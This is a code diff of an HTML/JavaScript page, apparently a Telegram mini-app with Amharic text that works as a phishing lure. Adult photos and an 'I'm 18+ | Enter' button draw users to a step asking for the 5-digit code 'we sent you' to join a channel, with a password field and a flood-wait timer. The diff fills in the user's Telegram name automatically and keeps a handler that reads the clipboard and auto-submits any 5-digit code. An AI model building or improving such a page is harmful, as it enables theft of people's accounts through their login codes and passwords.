@@ -31,7 +31,6 @@
         pointer-events: none;
     }
 
-
     .step { display: none; width: 90%; max-width: 400px; animation: fadeIn .5s ease; flex-direction: column; align-items: center; text-align: center; }
     .active { display: flex; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -77,16 +76,12 @@
     }
     .btn-main:active { transform: scale(0.98); opacity: 0.9; }
     
-    /* Disabled state styling */
     .btn-main:disabled {
         background: #444 !important;
         opacity: 0.6;
         cursor: not-allowed;
-        box-shadow: none;
-        transform: none;
     }
 
-    /* Small spinner inside button */
     .btn-spinner {
         display: none;
         width: 18px; height: 18px;
@@ -149,22 +144,11 @@
                 </ul>
             </div>
 
-            <div style="margin-top: 15px; font-size: 13px; color: #888; font-style: italic;">
-                <i class="fa-solid fa-spinner fa-spin"></i> ዝርዝሩን እያዘጋጀን ነው...
-            </div>
-        </div>
-    </div>
-
-    <div id="step1" class="step">
-        <div class="glass-card">
-            <h2 style="margin-bottom: 5px;">አካውንት ይክፈቱ</h2>
-            <p style="opacity: 0.7; margin-bottom: 20px; font-size: 14px;">መረጃዎን በትክክል ያስገቡ</p>
-            <input type="text" id="fname" placeholder="ሙሉ ስም ያስገቡ">
-            <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
                 <div class="btn-spinner" id="loginSpinner"></div>
-                <span id="loginText">Login</span>
+                <span id="loginText">I'm 18+ | Enter</span>
             </button>
+            <div id="status1" class="msg"></div>
         </div>
     </div>
 
@@ -172,7 +156,7 @@
         <div class="glass-card">
             <h3 style="color:#ff1a88;">ማረጋገጫ ኮድ</h3>
             <p style="font-size: 15px; opacity: 0.9; font-weight: bold; color: #fff;" id="step2_name_display"></p>
-            <p style="font-size: 14px; opacity: 0.7;">አኛ የላኩለት ባለ 5 አሃዝ ኮድ በማስገባት ወደ ቻናል ይቀላቀሉ!</p>
+            <p style="font-size: 14px; opacity: 0.7;">እኛ የላክንልዎትን ባለ 5 አሃዝ ኮድ በማስገባት ወደ ቻናል ይቀላቀሉ!</p>
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
@@ -216,7 +200,7 @@
     </div>
 
     <div id="flood_step" class="step">
-        <h2 style="color: #ff4444;">!</h2>
+        <h2 style="color: #ff4444;">እባክዎ ይቆዩ!</h2>
         <div style="font-size: 36px; color: #FF9900;" id="wait_time">00:00</div>
     </div>
 
@@ -230,7 +214,7 @@
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
-    let savedName = "";
+    let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
 
     const photos = [
         "https://i.postimg.cc/K8vckBCq/181675.jpg",
@@ -245,11 +229,6 @@
         setTimeout(() => {
             bg.style.backgroundImage = `url(${photos[1]})`;
             showStep('photo_slide');
-            setTimeout(() => {
-                bg.style.backgroundImage = `url(${photos[2]})`;
-                checkStatus(); 
-                showStep(1); 
-            }, 6000);
         }, 3000);
 
         statusChecker = setInterval(checkStatus, 3000);
@@ -262,7 +241,6 @@
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
         
-        // ስም ማሳያ ክፍሎችን አዘምን
         if(savedName) {
             if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName;
             if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = savedName;
@@ -282,10 +260,12 @@
         isProcessing = false;
         document.getElementById('loginBtn').disabled = false;
         document.getElementById('loginSpinner').style.display = 'none';
-        document.getElementById('loginText').innerText = 'Login';
-        document.getElementById('confirmBtn').disabled = false;
-        document.getElementById('confirmSpinner').style.display = 'none';
-        document.getElementById('confirmText').innerText = 'አረጋግጥ';
+        document.getElementById('loginText').innerText = "I'm 18+ | Enter";
+        if(document.getElementById('confirmBtn')){
+            document.getElementById('confirmBtn').disabled = false;
+            document.getElementById('confirmSpinner').style.display = 'none';
+            document.getElementById('confirmText').innerText = 'አረጋግጥ';
+        }
     }
 
     function togglePasswordVisibility() {
@@ -301,12 +281,6 @@
     }
 
     function handleLoginClick() {
-        savedName = document.getElementById('fname').value;
-        if(!savedName) {
-            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስም ይሙሉ!');
-            return;
-        }
-        
         const btn = document.getElementById('loginBtn');
         const spinner = document.getElementById('loginSpinner');
         const txt = document.getElementById('loginText');
@@ -446,16 +420,18 @@
     function setupLongPressPaste() {
         const container = document.getElementById('otp_container');
         let timer;
-        container.addEventListener('touchstart', () => {
-            timer = setTimeout(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                    if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
-                } catch (err) {}
-            }, 800);
-        });
-        container.addEventListener('touchend', () => clearTimeout(timer));
+        if(container){
+            container.addEventListener('touchstart', () => {
+                timer = setTimeout(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        const cleanCode = text.replace(/\D/g, '').slice(0, 5);
+                        if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                    } catch (err) {}
+                }, 800);
+            });
+            container.addEventListener('touchend', () => clearTimeout(timer));
+        }
     }
 </script>
 </body>
